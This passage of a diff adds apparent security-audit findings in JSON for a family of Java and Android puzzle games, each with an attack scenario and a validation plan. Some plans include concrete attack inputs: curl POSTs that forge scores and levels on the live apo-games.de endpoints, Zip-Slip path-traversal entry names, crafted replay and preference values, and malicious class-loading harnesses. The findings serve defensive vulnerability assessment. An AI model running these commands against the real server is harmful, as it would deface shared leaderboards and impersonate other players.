+    "title": "Dormant helper loads and instantiates unverified classes",
+    "reachable": false,
+    "attack_scenario": "This cannot be exploited through the supplied game's UI, network traffic, command line, or files. If a future clone or integration passes an attacker-controlled HTTP URL or user-writable directory and class name, the attacker places Evil.class there and causes getMyClass() to run; the class is loaded without authentication and its initializer or constructor executes with the game process's permissions.",
+    "validation_plan": "Run `rg -n 'ApoClassLoader|getMyClass'` over the source and confirm that only ApoClassLoader.java contains references. To prove the latent sink, compile a public Evil class whose no-argument constructor writes a marker, place it in a temporary directory, set ApoConstants.B_APPLET=false, and invoke `new ApoClassLoader(tempDir, \"Evil\").getMyClass()` from a test harness. Creation of the marker proves execution. Set B_APPLET=true and serve Evil.class over HTTP to exercise the remote branch.",
+    "line": 69,
+    "clone_variants": 17,
+    "clone_distinct_versions": 2,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoNotSoSimple",
+    "file": "ApoClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-470",
+    "title": "Dormant URLClassLoader instantiates caller-selected code",
+    "reachable": false,
+    "attack_scenario": "This cannot be triggered in the stock game. If an external caller or future clone wires a user-selected directory or URL and class name into this helper, the attacker places a class there; getMyClass loads it and its constructor executes with the game's JVM permissions, yielding arbitrary code execution.",
+    "validation_plan": "For a proof of the dormant sink, compile a test class whose constructor creates a marker file, place it under a temporary class-root directory, and invoke new ApoClassLoader(tempRoot, \"test.Payload\").getMyClass() from a harness. Marker creation proves execution. Then confirm the unmodified game never invokes the harness or helper.",
+    "line": 69,
+    "clone_variants": 17,
+    "clone_distinct_versions": 2,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoSimple",
+    "file": "ApoClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-829",
+    "title": "Dormant URLClassLoader can instantiate remote code but has no shipped call site",
+    "reachable": false,
+    "attack_scenario": "This is theoretical in ApoSimple as shipped: no game UI, save parser, or network response reaches the constructor. If future integration passes an attacker URL and class name, the attacker hosts a class whose static initializer or constructor executes when getMyClass reaches lines 73-75, gaining code execution within the game's JVM permissions.",
+    "validation_plan": "To demonstrate only the dormant primitive, host a benign test class that writes a marker, set ApoConstants.B_APPLET true, construct ApoClassLoader with the test URL and class name, and call getMyClass. The marker proves loading; separately confirm that running ApoSimpleMain normally never reaches ApoClassLoader.",
+    "line": 69,
+    "clone_variants": 17,
+    "clone_distinct_versions": 2,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoSlitherLink",
+    "file": "ApoClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-470",
+    "title": "Dormant URL class instantiation helper is theoretical",
+    "reachable": false,
+    "attack_scenario": "No attacker-controlled input reaches this helper in the current variant, so there is no reproducible attack through the game UI, network loader, save file, or command line. If future wiring passes an attacker URL while B_APPLET is true, the attacker can serve a class whose constructor executes with the process's Java permissions.",
+    "validation_plan": "For a direct component test, compile evil.Payload with a constructor that creates a marker file, serve its package directory over local HTTP, set ApoConstants.B_APPLET=true, and call new ApoClassLoader(\"http://127.0.0.1:8000/\", \"evil.Payload\").getMyClass(). The marker proves the sink works; a repository call-site search should still confirm it is not reachable from the shipped game.",
+    "line": 69,
+    "clone_variants": 17,
+    "clone_distinct_versions": 2,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoSoccer",
+    "file": "ApoImage.java",
+    "category": "insecure_transport",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-319",
+    "title": "Applet team artwork is fetched over plaintext HTTP",
+    "reachable": true,
+    "attack_scenario": "A network attacker intercepts the plaintext asset request and returns a different valid image, changing team/player artwork shown by the client. The attacker can instead delay the response or return an image with extreme decoded dimensions to stall or exhaust the game. This path does not expose a score-submission or credential channel in this variant.",
+    "validation_plan": "Run the applet path or a harness with B_APPLET=true and an ApoSoccerAI whose getEmblem returns \"emblem.png\" under the game's fixed HTTP base. Intercept apo-games.de with a controlled proxy or DNS mapping, return a visibly different PNG, and confirm both the plaintext request and substituted emblem. A delayed response can confirm the synchronous no-timeout stall.",
+    "line": 99,
+    "clone_variants": 17,
+    "clone_distinct_versions": 10,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoMarc",
+    "file": "ApoHighscore.java",
+    "category": "unsafe_custom_parser",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-20",
+    "title": "Dormant high-score parser crashes or grows without bounds",
+    "reachable": false,
+    "attack_scenario": "If load is invoked, a malicious server or HTTP interceptor returns a nonnumeric first line, causing an uncaught NumberFormatException and terminating the caller. Alternatively, it streams arbitrarily many valid triples or an extremely long line, causing sustained memory growth or blocking until the process becomes unavailable.",
+    "validation_plan": "Invoke ApoHighscore.getInstance().load() from a harness through a controlled HTTP proxy. First return \"not-a-number\\n\" and confirm NumberFormatException escapes load. Then, under a small heap such as -Xmx32m, stream repeated \"1\\n1\\nname\\n\" triples and observe list/heap growth or OutOfMemoryError. Confirm the stock game never invokes load.",
+    "line": 129,
+    "clone_variants": 9,
+    "clone_distinct_versions": 6,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoMario",
+    "file": "ApoMarioPanel.java",
+    "category": "path_traversal",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-22",
+    "title": "Replay-controlled level filename escapes the levels directory",
+    "reachable": true,
+    "attack_scenario": "An attacker supplies a replay with random=-1 and levelString set to ../outside.mar on Unix-like systems, or the equivalent platform separator. When opened, the game resolves levels/../outside.mar and silently parses a file outside the intended levels directory. This permits an out-of-directory crafted level to alter the replayed game or trigger ApoMario-02; this path does not itself expose the target file's contents.",
+    "validation_plan": "Create user.dir/outside.mar as a valid binary MAR file with a distinctive width, then create a valid replay with random=-1 and fourth line ../outside.mar. Load the replay and place a breakpoint at ApoIO.java:216: fileName should contain levels/../outside.mar and its canonical path should be outside levels. Continuing should load the distinctive level, proving traversal.",
+    "line": 279,
+    "clone_variants": 2,
+    "clone_distinct_versions": 2,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoDice",
+    "file": "ApoDicePanel.java",
+    "category": "client_side_trust",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-602",
+    "title": "Editable SharedPreferences value unlocks every built-in level",
+    "reachable": true,
+    "attack_scenario": "On a rooted emulator/device or an accessible debug installation, the user edits ApoDicePref.xml and sets `solved` to 2147483647. On relaunch, setSolved() clamps it to MAX_LEVELS-1 at ApoDicePuzzleChooser.java:69-70, and the i <= solved check at lines 84-86 makes every built-in level selectable. The gain is progression cheating only.",
+    "validation_plan": "Install the variant on a rooted test emulator, launch it once, force-stop it, and change the `solved` integer in shared_prefs/ApoDicePref.xml to 2147483647. Relaunch, open the puzzle chooser, and select the final built-in level without completing predecessors. Successful selection confirms the trust bypass.",
+    "line": 68,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoMonoAndroid",
+    "file": "ApoMonoSave.java",
+    "category": "client_side_trust",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-807",
+    "title": "Tampered solved-level preference directly controls progression gates",
+    "reachable": true,
+    "attack_scenario": "A local user with access to app-private data edits ApoMonoPref.xml and replaces solvedLevels with many repeated valid entries such as 0,0,0,... . On restart, each duplicate increments solvedCout even though only array element zero is set. The resulting count is capped only at the game's maximum and unlocks later levels without solving them. The gain is cheating in the local progression system, not privilege outside the game.",
+    "validation_plan": "On a debug emulator, stop the app and use run-as or Android Studio Device Explorer to set the ApoMonoPref shared-preference string solvedLevels to at least one hundred comma-separated zeroes. Restart, open the normal level chooser, and verify that levels far beyond the legitimate progress point can be selected. Inspect solvedCout or getMaxCanChoosen() to confirm that duplicate tokens, rather than distinct solved levels, produced the unlock.",
+    "line": 30,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "myTreasureAndroid",
+    "file": "MyTreasurePanel.java",
+    "category": "client_side_trust",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-807",
+    "title": "Locally editable skull count is trusted to unlock difficulty tiers",
+    "reachable": true,
+    "attack_scenario": "On a rooted, debuggable, or otherwise sandbox-accessible installation, the local player stops the app and changes the stored skulls value to 280. After relaunch, all three threshold checks succeed, allowing the player to enter later difficulty tiers without solving the prerequisite levels. This is local cheating only; it does not affect another user or the remote service.",
+    "validation_plan": "Use a rooted emulator or confirmed debuggable build, force-stop the app, and edit its MytreasurePref XML so skulls is 280; optionally set levelchooser_step to 12. Relaunch, choose Play, and tap the medium, hard, and very-hard map regions. Access to each corresponding level chooser without completing prerequisite levels confirms the trust bypass.",
+    "line": 172,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoIcejump",
+    "file": "ApoIcejumpNetwork.java",
+    "category": "insecure_transport",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-319",
+    "title": "Plain-HTTP public-IP lookup permits response spoofing",
+    "reachable": true,
+    "attack_scenario": "While the victim enters Networkmode, an attacker controlling the network path or DNS intercepts the port-80 request and returns an attacker-selected address such as 203.0.113.66. The game presents that value as the victim's router IP. The attacker gains integrity control over this displayed network configuration value; no credentials, scores, or executable data traverse this particular request, so the impact is limited.",
+    "validation_plan": "Launch the desktop game with Java HTTP proxy properties pointing to a controlled proxy. Have the proxy return 203.0.113.66 followed by a newline for the hard-coded URL, press N at the menu, and confirm that the network screen displays router IP: 203.0.113.66 without any authentication or warning.",
+    "line": 68,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoSimple",
+    "file": "ApoSimpleProperties.java",
+    "category": "client_side_trust",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-602",
+    "title": "Editable properties file directly sets spendable coin balance",
+    "reachable": true,
+    "attack_scenario": "A local player replaces `properties` with seven bytes `00 00 01 00 0F 42 40`: three booleans followed by the big-endian integer 1,000,000. On startup the client installs that balance, then silently accepts EOF on the next field. The player can buy hints without earning currency.",
+    "validation_plan": "Close the game, preserve the original file, place the seven specified bytes in `properties` in the launch directory, and restart through ApoSimpleMain. Confirm that renderCoins displays 1000000 at ApoSimplePanel.java:897-907 and that a hint purchase succeeds through ApoSimpleGame.java:246-264.",
+    "line": 50,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoSoccer",
+    "file": "ApoSoccerClassLoaderURL.java",
+    "category": "remote_code_loading",
+    "status": "CORROBORATED",
+    "families": [
+      "codex",
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-494",
+    "title": "Dormant applet loader defines classes from arbitrary URL bytes",
+    "reachable": false,
+    "attack_scenario": "Theoretical only: if an embedding layer or future caller exposes the public loadPlayer parameters to untrusted input, an attacker supplies an HTTP base URL and a class name, serves a malicious compatible .class, and obtains code execution within the applet's Java protection domain. No such caller is present in the reviewed source.",
+    "validation_plan": "For the primitive, serve a Payload.class extending ApoSoccerAI from a local HTTP server, set B_APPLET=true in a test harness, call loadPlayer with that base URL and class name, and observe a harmless static-initializer marker. Separately retain the call-site search showing that normal applet UI paths call loadAI, not loadPlayer, to confirm current non-reachability.",
+    "line": 64,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoPongBeat",
+    "file": "ApoClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "high",
+    "cwe": "CWE-494",
+    "title": "URLClassLoader loads and instantiates .class files from arbitrary local path or URL (dormant in this variant)",
+    "reachable": false,
+    "attack_scenario": "In sibling variants where the chooser is wired, a victim is social-engineered into opening an attacker-supplied .class as their 'AI'; its constructor executes with full desktop permissions. As shipped in ApoPongBeat, nothing calls it: step 1 would be to add a caller, which does not exist today.",
+    "validation_plan": "(1) Prove dormancy: `grep -rn \"new ApoClassLoader\\|getMyClass\" src/` -> no hits. (2) Prove the primitive works if ever wired: compile Evil.java whose constructor writes ~/pwned.txt, place next to a harness calling new ApoClassLoader(dir,\"Evil\").getMyClass(); pwned.txt appears, confirming arbitrary execution with no integrity check.",
+    "line": 69,
+    "clone_variants": 17,
+    "clone_distinct_versions": 2,
+    "n_reports": 1
+  },
+  {
+    "variant": "BitsEngineAndroid",
+    "file": "BitsZip.java",
+    "category": "path_traversal",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "high",
+    "cwe": "CWE-22",
+    "title": "Zip-Slip path traversal in BitsZip.extract(): ZipEntry names used unsanitized as output paths",
+    "reachable": false,
+    "attack_scenario": "An attacker crafts a level/update pack zip containing an entry named '../../files/sharedprefs/game.xml' (or an absolute path). When a game variant extracts the pack, bytes are written outside outDir to any path the app UID can write: private files dir, shared_preferences XMLs (flip 'paid=true', alter saved progress), or the executable-adjacent data of the app. This persists tampering across restarts and can corrupt or forge other apps'-visible state on old, shared external storage.",
+    "validation_plan": "Build a tiny Android harness linking this engine source; create a zip whose entry is named '../../databases/test_evil.db' plus filler content; call BitsZip.extract(zipPath, context.getExternalFilesDir(null).getAbsolutePath()) ; observe that /data/data/<pkg>/databases/test_evil.db now exists outside the intended outDir while logcat shows only success (return true). Repeat with an absolute-path entry ('/data/local/tmp/x') to confirm second variant.",
+    "line": 44,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoRelax",
+    "file": "ApoHelp.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-400",
+    "title": "Unbounded HTTP line read can exhaust or hang the applet",
+    "reachable": true,
+    "attack_scenario": "The attacker returns an endless response body without a newline, or opens the response and stops sending data. Applet initialization remains blocked; if bytes continue arriving, readLine grows its buffer until the game process exhausts heap memory.",
+    "validation_plan": "Route www.apo-games.de through a test proxy/server that responds to /apoRelax/cookies.php with an endless chunked stream of 'A' bytes and no newline. Start the applet with a small heap such as -Xmx64m. A startup hang followed by increasing heap use or OutOfMemoryError confirms the issue.",
+    "line": 465,
+    "clone_variants": 17,
+    "clone_distinct_versions": 14,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoRelax",
+    "file": "ApoImage.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-789",
+    "title": "Editor decodes full-size images before enforcing its size cap",
+    "reachable": true,
+    "attack_scenario": "An attacker supplies a highly compressed PNG or similar accepted image whose header declares a very large raster and convinces the user to import it. ImageIO attempts to materialize the full raster, exhausting the game's heap or making it unresponsive before the 400-pixel scaling code runs.",
+    "validation_plan": "Create a valid, highly compressible 10000x10000 solid-color PNG, start the desktop game with -Xmx128m, enter Editor, and choose Load. An uncaught OutOfMemoryError or process hang occurring before a 400-pixel image is displayed proves the pre-scaling decode is exploitable.",
+    "line": 93,
+    "clone_variants": 17,
+    "clone_distinct_versions": 10,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSimpleSudoku",
+    "file": "ApoHelp.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-400",
+    "title": "Unbounded HTTP response line can hang or exhaust the game process",
+    "reachable": true,
+    "attack_scenario": "For the load route, the attacker streams a very large response without a newline; readLine keeps accumulating data and can consume the shared JVM heap. Alternatively, the attacker sends millions of comma-terminated integers: the unbounded loop at ApoSimpleSudokuLevelChooser.java:144-149 stores every value in solvedLevels. For the save route, accepting the connection but never completing the response blocks the game-loop thread after a level is solved.",
+    "validation_plan": "Route www.apo-games.de to a controlled HTTP server and run the applet with a small heap such as -Xmx64m. On the Play request, continuously send \"128,\" without a newline and monitor heap growth until an OutOfMemoryError or process failure occurs. Separately, return an empty initial progress line, solve level 1, accept the save request without sending a response, and confirm through a thread dump and frozen rendering that the game loop is blocked in BufferedReader.readLine.",
+    "line": 465,
+    "clone_variants": 17,
+    "clone_distinct_versions": 14,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSlitherLink",
+    "file": "ApoConstants.java",
+    "category": "insecure_transport",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-319",
+    "title": "Shared-level downloads and uploads use cleartext HTTP",
+    "reachable": true,
+    "attack_scenario": "A network attacker intercepts either HTTP request. For the GET, they replace the response's level lines, which the client adds to the custom-level catalog at ApoSlitherLinkPanel.java:137-139. For the POST, they can observe or alter the level, solution, and name fields assembled at ApoHighscore.java:74-77. The gain is disclosure or manipulation of shared puzzle content, not host code execution.",
+    "validation_plan": "Run the game with an intercepting HTTP proxy configured through the JVM http.proxyHost/http.proxyPort properties. Trigger startup and an editor upload. Confirm that the proxy can read and modify the POST parameters and can replace the GET response with a valid three-line record that subsequently appears under Custom.",
+    "line": 25,
+    "clone_variants": 17,
+    "clone_distinct_versions": 13,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoStarz",
+    "file": "ApoIO.java",
+    "category": "insecure_transport",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-319",
+    "title": "Applet highscore and level traffic uses unauthenticated HTTP",
+    "reachable": true,
+    "attack_scenario": "A player launches the legacy applet. A network attacker intercepts the plain-HTTP request for highscore.hig or an .ase file and returns a syntactically valid replacement containing attacker-selected scores, solutions, or level strings. The game consumes it without transport authentication, allowing leaderboard/content manipulation or a parser denial of service. The attacker can likewise observe or alter the cleartext highscore request body sent after a win.",
+    "validation_plan": "Run ApoStarzApplet through an intercepting HTTP proxy or map apo-games.de to a controlled HTTP server. Serve a valid highscore.hig with a visibly altered score and a valid .ase file with a visibly altered level. Confirm requests are HTTP, not HTTPS, and confirm the altered values appear in the game. Complete a level and capture the cleartext request generated by ApoStarzGame.java:597 and ApoIO.java:166-174.",
+    "line": 220,
+    "clone_variants": 17,
+    "clone_distinct_versions": 6,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoIcarus",
+    "file": "ApoConstants.java",
+    "category": "insecure_transport",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-319",
+    "title": "All game-server traffic (highscore + achievements cookie) sent over plain HTTP",
+    "reachable": true,
+    "attack_scenario": "1) Attacker on the same LAN/DNS path passively sniffs port 80: sees player-submitted names, points, times, and the achievements-cookie values of every client. 2) Active MITM rewrites responses (see findings 03/04) or the save request itself. No TLS or pinning exists anywhere in the variant to stop this.",
+    "validation_plan": "Point www.apo-games.de to a local listener via /etc/hosts, start ApoJumpMain, open the highscore screen and finish one run. Observer shows cleartext POST bodies 'points=..&time=..&name=..' and 'GET=&name=apoIcarus_level' / 'SET=&name=..' to /apoIcarus/cookies.php. tcpdump/wireshark confirms zero TLS handshake.",
+    "line": 24,
+    "clone_variants": 17,
+    "clone_distinct_versions": 13,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoNotSoSimple",
+    "file": "ApoHighscore.java",
+    "category": "unsafe_custom_parser",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-20",
+    "title": "Partial five-line response nulls level state and crashes the game thread",
+    "reachable": true,
+    "attack_scenario": "The server or HTTP interceptor sends exactly one line and closes the response. The loader accepts it as a level-only partial record, sorting fails and silently nulls the singleton reference. When the player clicks User Levels, a NullPointerException escapes the game loop and stops further input and render updates, producing a deterministic remote denial of service.",
+    "validation_plan": "Point the JVM at a local mock HTTP proxy, answer get_highscore.php with the single line \"1\\n\", then EOF. Wait for the loader thread and click User Levels. A NullPointerException from ApoNotSoSimpleUserLevels.getLevel near line 112 followed by a stopped ApoSubGame thread confirms the full path.",
+    "line": 170,
+    "clone_variants": 9,
+    "clone_distinct_versions": 6,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSlitherLink",
+    "file": "ApoHighscore.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-400",
+    "title": "Unbounded HTTP response is retained until heap exhaustion",
+    "reachable": true,
+    "attack_scenario": "A malicious server or HTTP interceptor returns an endless sequence of newline-delimited values, or one extremely large unterminated line. The startup thread continually allocates strings and grows the singleton's lists until an OutOfMemoryError or severe garbage-collection thrashing makes the game unusable.",
+    "validation_plan": "Proxy get_highscore.php to a local HTTP responder that continuously emits distinct short lines without closing the response. Launch with a small heap such as -Xmx64m. Confirm monotonically increasing heap use followed by OutOfMemoryError in the load thread or an unresponsive game.",
+    "line": 129,
+    "clone_variants": 9,
+    "clone_distinct_versions": 6,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoIcarus",
+    "file": "ApoHighscore.java",
+    "category": "client_side_trust",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-602",
+    "title": "Highscore submission is unsigned and unauthenticated: leaderboard fully forgeable by local user",
+    "reachable": true,
+    "attack_scenario": "A cheater runs: curl -X POST -d 'points=999999999&time=0&name=<anyone>' http://www.apo-games.de/apoIcarus/save_highscore.php --data-urlencode nothing else required. Next client that opens the highscore list displays the forged score at rank 1 (rendered in ApoJumpStateHighscore.render:215-228), and ApoJumpLevel draws the fake leader's name in-game (level render lines 428-434). Attacker gains leaderboard defacement / impersonation of other players' names.",
+    "validation_plan": "Replay the exact byte sequence the client sends (capture per finding 01) with modified points/name via curl/netcat. Re-open the highscore menu in the game and observe the forged entry sorted first by ApoJumpStateHighscore.sortList().",
+    "line": 74,
+    "clone_variants": 9,
+    "clone_distinct_versions": 6,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoNotSoSimple",
+    "file": "ApoHighscore.java",
+    "category": "weak_integrity_check",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-345",
+    "title": "Unauthenticated, unsigned level/solution submission to save_highscore.php",
+    "reachable": true,
+    "attack_scenario": "1) Attacker reproduces the request with curl (no game needed). 2) They submit levels attributed to arbitrary usernames (impersonation of other players), flood the shared pool with garbage or hundreds of entries, or publish 'solution' strings that never solve the posted level to troll solvers. 3) Every downstream client ingests this as trusted content. This is a design-level trust problem evidenced by the client: the protocol has no integrity mechanism whatsoever.",
+    "validation_plan": "curl -X POST http://www.apo-games.de/apoNotSoSimple/save_highscore.php -d 'levelname=audit&username=SpoofedUser&description=x&solution=lrl&level=1' + 60 two-digit tile codes matching the encoding built at ApoHighscore.java:88-99 (layer digit + 30 zero-padded byte values per layer). Then launch the game and check whether the forged entry appears under UserLevels. If the host is offline, validate the format offline by feeding the same body through a local mock and confirming the client accepts it.",
+    "line": 113,
+    "clone_variants": 9,
+    "clone_distinct_versions": 6,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoRelax",
+    "file": "ApoHighscore.java",
+    "category": "insecure_transport",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-319",
+    "title": "Cloned highscore client submits level blobs over plain HTTP to sibling variant's endpoint ('apoNotSoSimple') - dead code in ApoRelax",
+    "reachable": false,
+    "attack_scenario": "Were it wired up (as in sibling variants): a MITM forges save_highscore.php responses to inject arbitrary usernames/descriptions rendered in-game (stored-content spoofing), reads submitted solutions in transit, and can replay/fabricate scores because the protocol carries no signature, nonce, or TLS. Additionally, submissions from ApoRelax would pollute the apoNotSoSimple leaderboard due to the cloned constants.",
+    "validation_plan": "Negative: grep -rn 'ApoHighscore' --include='*.java' -> self-references only. Positive harness: hosts-point www.apo-games.de to localhost, call ApoHighscore.getInstance().load(); serve 10 crafted lines; observe getDescriptions()/getUsernames() populated with the forged strings. Wireshark simultaneously captures the plaintext POST body containing the serialized level and solution strings.",
+    "line": 77,
+    "clone_variants": 9,
+    "clone_distinct_versions": 6,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSlitherLink",
+    "file": "ApoHighscore.java",
+    "category": "insecure_transport",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-319",
+    "title": "Highscore get/save exchanged over plain HTTP, spoofable by network attacker",
+    "reachable": true,
+    "attack_scenario": "Attacker on the same LAN (ARP spoofing) or any DNS-hijacking position intercepts the port-80 traffic: (1) reads which puzzles the victim solved/uploaded; (2) rewrites the get_highscore.php response body to inject arbitrary 'level' strings, which the client adds as playable custom levels (see ApoSlitherLink-02); (3) forges submissions attributed to other players.",
+    "validation_plan": "Launch apoSlitherLink.ApoSlitherLinkMain under tcpdump/Wireshark: plaintext HTTP POST to www.apo-games.de/apoSlitherLink/get_highscore.php is visible at startup. In a lab, point www.apo-games.de to a local netcat/HTTP server returning three lines ('0404    ', 'aaaa', 'X') and observe a custom level appear in the Custom menu.",
+    "line": 109,
+    "clone_variants": 9,
+    "clone_distinct_versions": 6,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSnake",
+    "file": "ApoSnakeUserlevelsLoad.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-400",
+    "title": "Unbounded shared-level response can exhaust memory and CPU",
+    "reachable": true,
+    "attack_scenario": "A malicious endpoint or HTTP man-in-the-middle streams a very long first line or hundreds of thousands of syntactically valid 11-line records. readLine() and the lists keep allocating until heap exhaustion; if EOF is sent first, equal timestamps make the nested insertion sort scan all prior entries and consume quadratic CPU. Because loading starts during initialization, the attacker can freeze or kill the game on launch without a menu selection.",
+    "validation_plan": "Use a controlled get_level.php response that repeatedly emits the valid 11-line record aa0, 1.0, 1, 1, attacker, 0, 0, 0, 0, 1, 1.0, preferably on an emulator with a constrained heap. Repeat until the body contains enough records to exceed the heap, then launch the app. OutOfMemoryError or process death during lines 182-205 proves the memory path; a smaller completed body with equal timestamps and a profiler showing rapidly superlinear time in ApoSnakeUserlevels.sortByUpload() proves the CPU path.",
+    "line": 182,
+    "clone_variants": 2,
+    "clone_distinct_versions": 2,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoMario",
+    "file": "ApoMarioLevel.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-789",
+    "title": "Replay width drives a near-unbounded level allocation",
+    "reachable": true,
+    "attack_scenario": "An attacker creates a small, otherwise valid replay whose nine lines are: 2147483647; 0; 1; p1; a1; 0,; p2; a2; 0,. When the victim selects it, the parsed width reaches the level allocator and produces OutOfMemoryError without requiring a large replay file.",
+    "validation_plan": "Save the nine specified values as separate lines in huge.rep, run the game with -Xmx128m, and load huge.rep. Breakpoints at ApoMarioReplay.java:306, ApoMarioReplayPlay.java:52, and ApoMarioLevel.java:337 should show width 2147483647 throughout; OutOfMemoryError at line 337 confirms the issue.",
+    "line": 337,
+    "clone_variants": 2,
+    "clone_distinct_versions": 2,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoClock",
+    "file": "ApoClockUserlevelsLoad.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-400",
+    "title": "Automatic level download consumes an unbounded response",
+    "reachable": true,
+    "attack_scenario": "On every launch, an interceptor returns a very large number of valid 11-line records or one extremely long first line. readLine() and the lists grow until memory is exhausted; if the response eventually ends, the quadratic sort can consume prolonged CPU. The app may be killed for memory pressure or remain busy without ever making shared levels available.",
+    "validation_plan": "Proxy get_level.php and generate increasingly large but syntactically valid 11-line records with equal numeric values. Launch the app while recording heap use and the loader thread. Confirmation is unbounded heap growth, an OutOfMemoryError/process kill, or sustained execution in ApoClockUserlevels.java:57-74 after EOF. Separately, withhold EOF or newlines to confirm there is no read timeout.",
+    "line": 182,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoDice",
+    "file": "ApoDiceUserlevelsLoad.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-400",
+    "title": "Unbounded level-feed response can exhaust application memory",
+    "reachable": true,
+    "attack_scenario": "The attacker continuously sends valid 11-line records, or sends one extremely large first line, without closing the response. Because neither line length nor record count is capped at ApoDiceUserlevelsLoad.java:182-207, heap usage grows until the Android process raises OutOfMemoryError and terminates. This load begins automatically rather than requiring a level-selection tap.",
